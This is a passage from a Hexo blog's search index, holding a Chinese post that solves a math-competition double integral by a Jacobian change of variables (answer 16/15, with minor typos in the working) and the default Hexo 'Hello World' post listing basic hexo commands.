，<strong>雅可比行列式</strong>是:</p><div align=center><img src="https://latex.codecogs.com/svg.image?\mathbf{J}=\left|\frac{\partial(x,&space;y)}{\partial(u,&space;v)}\right|=\left|\begin{array}{ll}x_u&space;&&space;x_v&space;\\y_u&space;&&space;y_v\end{array}\right|" title="https://latex.codecogs.com/svg.image?\mathbf{J}=\left|\frac{\partial(x, y)}{\partial(u, v)}\right|=\left|\begin{array}{ll}x_u & x_v \\y_u & y_v\end{array}\right|" /> </div><em>这只是公式，其条件需要读者自寻理解。(ps：我也是小菜鸟)</em><p><img src="https://s2.loli.net/2022/10/15/61EHL8sva3ZlQNu.jpg" alt="1665809444664.jpg"><br><em><center>（给上书本的定义，我也理解理解）</center></em><br>　　这里有个值得注意的是在积分是dxdy代表的是<strong>面积</strong>，所以在变换时需要对<strong>J</strong>加上绝对值,所以原式可以化为下面这样</p><div align=center><img src="https://latex.codecogs.com/svg.image?\iint_{D1}&space;\frac{u&space;\ln&space;(1&plus;v)}{\sqrt{1-u}}\left|\frac{\partial(x,&space;y)}{\partial(u,&space;v)}\right|&space;d&space;u&space;d&space;v." title="https://latex.codecogs.com/svg.image?\iint_{D1} \frac{u \ln (1+v)}{\sqrt{1-u}}\left|\frac{\partial(x, y)}{\partial(u, v)}\right| d u d v." /></div><div align=center><img src="https://latex.codecogs.com/svg.image?\left|\frac{\partial(x,&space;y)}{\partial(u,&space;v)}\right|=||&space;\begin{array}{ll}x_u&space;&&space;x_v&space;\\y_u&space;&&space;y_v\end{array}||=|&space;\frac{u}{(1&plus;v)^2}&space;\mid" title="https://latex.codecogs.com/svg.image?\left|\frac{\partial(x, y)}{\partial(u, v)}\right|=|| \begin{array}{ll}x_u & x_v \\y_u & y_v\end{array}||=| \frac{u}{(1+v)^2} \mid" /></div><p>下面来找一找积分区域：<br>　　原来的积分区域:</p><div align=center><img src="https://s2.loli.net/2022/10/15/7r1SyMhCcntuiDP.png" width=""></div>　　则 <img src="https://latex.codecogs.com/svg.image?\color{red}{u&space;=&space;x&space;&plus;&space;y}" title="https://latex.codecogs.com/svg.image?\color{red}{u = x + y}" /> 可以看作u在该可行域内的线性规划，易求得u的范围为（0,1） 而 <img src="https://latex.codecogs.com/svg.image?\color{red}{v&space;=&space;y&space;/&space;x}" title="https://latex.codecogs.com/svg.image?\color{red}{v = y / x}" /> 则可以看作过远点的直线在该区域内可行的斜率，易得角度为(0,pi/2),所以y的范围为(0，+∞)。<div align=center><img src="https://latex.codecogs.com/svg.image?\begin{aligned}&\int_0^1&space;\frac{\mu^2}{\sqrt{1-\mu}}&space;d&space;\mu&space;\int_0^{&plus;\infty}&space;\frac{\ln&space;(1&plus;v)}{(1&plus;v)^2}&space;d&space;u&space;.&space;\\&\int_0^1&space;\frac{\mu^2}{\sqrt{1-\mu}}&space;d&space;u&space;\stackrel{\sqrt{1-\mu}=t}{=}&space;\int_1^0&space;\frac{\left(1-t^2\right)^2}{t}&space;\cdot(-2&space;t)&space;d&space;t&space;\\&=-2\left(\left.t\right|_1&space;^0-\left.\frac{2}{3}&space;t^3\right|_1&space;^0&plus;\frac{1}{5}\left.t^5\right|_1&space;^0\right)&space;\\&=\frac{16}{15}\end{aligned}" title="https://latex.codecogs.com/svg.image?\begin{aligned}&\int_0^1 \frac{\mu^2}{\sqrt{1-\mu}} d \mu \int_0^{+\infty} \frac{\ln (1+v)}{(1+v)^2} d u . \\&\int_0^1 \frac{\mu^2}{\sqrt{1-\mu}} d u \stackrel{\sqrt{1-\mu}=t}{=} \int_1^0 \frac{\left(1-t^2\right)^2}{t} \cdot(-2 t) d t \\&=-2\left(\left.t\right|_1 ^0-\left.\frac{2}{3} t^3\right|_1 ^0+\frac{1}{5}\left.t^5\right|_1 ^0\right) \\&=\frac{16}{15}\end{aligned}" /></div><div align=center><img src="https://latex.codecogs.com/svg.image?\begin{aligned}\int_0^{&plus;\infty}&space;\frac{\ln&space;(1&plus;v)}{(1&plus;v)^2}&space;d&space;v&space;&=\int_0^{&plus;\infty}&space;\ln&space;(1&plus;v)&space;d\left(-\frac{1}{1&plus;v}\right)&space;\\&=\left.-\frac{\ln&space;(1&plus;v)}{1&plus;v}\right|_0&space;^{&plus;\infty}&plus;\int_0^{&plus;\infty}&space;\frac{1}{\left(1&plus;v^2\right)^2}&space;d&space;v&space;\\&=0-\left.\frac{1}{1&plus;v}\right|_0&space;^{&plus;\infty}&space;\\&=1\end{aligned}" title="https://latex.codecogs.com/svg.image?\begin{aligned}\int_0^{+\infty} \frac{\ln (1+v)}{(1+v)^2} d v &=\int_0^{+\infty} \ln (1+v) d\left(-\frac{1}{1+v}\right) \\&=\left.-\frac{\ln (1+v)}{1+v}\right|_0 ^{+\infty}+\int_0^{+\infty} \frac{1}{\left(1+v^2\right)^2} d v \\&=0-\left.\frac{1}{1+v}\right|_0 ^{+\infty} \\&=1\end{aligned}" /></div><p>所以答案为<strong>16&#x2F;15</strong><br>　　下面附上一张参考答案的图：</p><div align=center><img src="https://s2.loli.net/2022/10/15/r6dFzqPkytagxR7.png" width=""></div><p><strong>感谢观看</strong></font></p><p><em>参考文章:</em><br><a href="markdown.com.cn/basic-syntax/">数学背景知识补充——雅可比矩阵 by Tiger</a><br><a href="https://www.bilibili.com/video/BV1oY4y1F7NB/?spm_id_from=333.999.0.0&vd_source=3ae03810e5d4ba6e6b93c5edd6c76912">全国大学生数学竞赛历年真题逐题精讲</a><br><a href="https://zhuanlan.zhihu.com/p/421295397">第一届全国大学生数学竞赛预赛试题及解析（非数学类）</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 数学竞赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/10/13/hello-world/"/>
      <url>/2022/10/13/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
